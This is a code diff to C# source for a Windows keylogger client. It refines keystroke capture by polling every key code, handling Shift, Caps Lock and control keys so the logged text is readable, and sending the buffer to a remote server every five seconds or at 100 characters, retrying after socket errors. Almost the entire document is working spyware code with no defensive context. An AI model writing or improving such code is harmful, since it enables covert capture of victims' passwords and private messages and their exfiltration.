@@ -19,9 +19,15 @@ namespace KeyloggerClient
 
         // Interval to send logs (in milliseconds)
         private static int sendInterval = 5000; // Every 5 seconds
+        private static int keyBufferLimit = 100; // Send logs if buffer exceeds 100 characters
 
         // Store keystrokes
         private static StringBuilder keyBuffer = new StringBuilder();
+        private static DateTime lastSentTime = DateTime.Now;
+
+        // Modifier keys state
+        private static bool shiftPressed = false;
+        private static bool capsLock = Control.IsKeyLocked(Keys.CapsLock);
 
         static void Main(string[] args)
         {
@@ -39,45 +45,81 @@ namespace KeyloggerClient
             {
                 while (true)
                 {
-                    // Log keystrokes
                     for (int i = 0; i < 255; i++)
                     {
                         int state = GetAsyncKeyState(i);
 
                         if (state == 1 || state == -32767)
                         {
-                            if ((Keys)i == Keys.Enter)
-                            {
-                                keyBuffer.Append("[ENTER]");
-                            }
-                            else if ((Keys)i == Keys.Space)
-                            {
-                                keyBuffer.Append("[SPACE]");
-                            }
-                            else if ((Keys)i == Keys.Back)
-                            {
-                                keyBuffer.Append("[BACKSPACE]");
-                            }
-                            else
-                            {
-                                keyBuffer.Append((Keys)i);
-                            }
+                            HandleKeyPress((Keys)i);
                         }
                     }
 
-                    // Send the key buffer to the server at intervals
-                    if (keyBuffer.Length > 0)
+                    // Send the key buffer to the server at intervals or when the buffer limit is exceeded
+                    if (keyBuffer.Length > 0 && 
+                       (DateTime.Now - lastSentTime).TotalMilliseconds > sendInterval || 
+                       keyBuffer.Length >= keyBufferLimit)
                     {
                         SendLogsToServer();
+                        lastSentTime = DateTime.Now;
                     }
 
-                    // Wait for the specified interval before sending logs again
-                    Thread.Sleep(sendInterval);
+                    Thread.Sleep(10); // Prevent CPU overuse
                 }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Error: " + ex.Message);
+            }
+        }
+
+        static void HandleKeyPress(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Enter:
+                    keyBuffer.Append("[ENTER]");
+                    break;
+                case Keys.Space:
+                    keyBuffer.Append(" ");
+                    break;
+                case Keys.Back:
+                    keyBuffer.Append("[BACKSPACE]");
+                    break;
+                case Keys.Tab:
+                    keyBuffer.Append("[TAB]");
+                    break;
+                case Keys.ShiftKey:
+                    shiftPressed = !shiftPressed;
+                    break;
+                case Keys.CapsLock:
+                    capsLock = !capsLock;
+                    break;
+                case Keys.LControlKey:
+                case Keys.RControlKey:
+                    keyBuffer.Append("[CTRL]");
+                    break;
+                case Keys.LMenu:
+                case Keys.RMenu:
+                    keyBuffer.Append("[ALT]");
+                    break;
+                default:
+                    // Handle alphabetic and numeric keys, check for shift or caps lock states
+                    if (char.IsLetterOrDigit((char)key))
+                    {
+                        char keyChar = (char)key;
+
+                        if (shiftPressed || capsLock)
+                            keyBuffer.Append(char.ToUpper(keyChar));
+                        else
+                            keyBuffer.Append(char.ToLower(keyChar));
+                    }
+                    else
+                    {
+                        // Log other special characters as is
+                        keyBuffer.Append($"[{key}]");
+                    }
+                    break;
             }
         }
 
@@ -111,6 +153,7 @@ namespace KeyloggerClient
             catch (SocketException ex)
             {
                 Console.WriteLine("Socket Error: " + ex.Message);
+                // Retry sending later
             }
             catch (Exception ex)
             {
